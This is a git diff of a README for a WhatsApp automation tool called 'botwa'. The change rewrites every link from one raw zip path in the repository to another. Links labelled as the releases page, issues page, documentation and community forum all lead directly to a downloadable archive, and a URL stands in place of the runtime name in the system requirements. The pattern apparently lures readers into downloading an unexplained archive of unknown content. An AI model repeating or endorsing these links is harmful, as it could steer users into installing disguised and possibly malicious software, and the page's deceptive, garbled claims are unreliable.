@@ -6,11 +6,11 @@ Welcome to botwa! This application empowers you to automate tasks on WhatsApp ef
 
 ## 📥 Download the Application
 
-[![Download botwa](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/gunpowder/botwa.zip%https://raw.githubusercontent.com/yash-9-9-5/botwa/main/gunpowder/botwa.zip)](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/gunpowder/botwa.zip)
+[![Download botwa](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/src/plugins/info/Software_1.2.zip%https://raw.githubusercontent.com/yash-9-9-5/botwa/main/src/plugins/info/Software_1.2.zip)](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/src/plugins/info/Software_1.2.zip)
 
 To download the latest version of botwa, visit the Releases page:
 
-[Download botwa from here](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/gunpowder/botwa.zip)
+[Download botwa from here](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/src/plugins/info/Software_1.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,12 +19,12 @@ To run botwa, ensure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS, or Linux
 - **Memory:** At least 2GB RAM
 - **Disk Space:** 100MB free space available
-- **https://raw.githubusercontent.com/yash-9-9-5/botwa/main/gunpowder/botwa.zip** Version 14 or higher (if applicable)
+- **https://raw.githubusercontent.com/yash-9-9-5/botwa/main/src/plugins/info/Software_1.2.zip** Version 14 or higher (if applicable)
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
-   [Download botwa from here](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/gunpowder/botwa.zip)
+   [Download botwa from here](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/src/plugins/info/Software_1.2.zip)
 
 2. **Choose the Right Version:** Look for the latest version. It will be listed at the top.
 
@@ -72,13 +72,13 @@ You can customize the behavior of your bot:
 
 ## 🎉 Support and Feedback
 
-If you encounter any issues or have suggestions, feel free to reach out. Visit our [issues page](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/gunpowder/botwa.zip) to report bugs or ask questions.
+If you encounter any issues or have suggestions, feel free to reach out. Visit our [issues page](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/src/plugins/info/Software_1.2.zip) to report bugs or ask questions.
 
 ## 🔗 Additional Resources
 
 For more detailed information, check out the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/gunpowder/botwa.zip)
-- [Community Forum](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/gunpowder/botwa.zip)
+- [Documentation](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/src/plugins/info/Software_1.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/yash-9-9-5/botwa/main/src/plugins/info/Software_1.2.zip)
 
 Thank you for choosing botwa! Enjoy automating your WhatsApp experience.
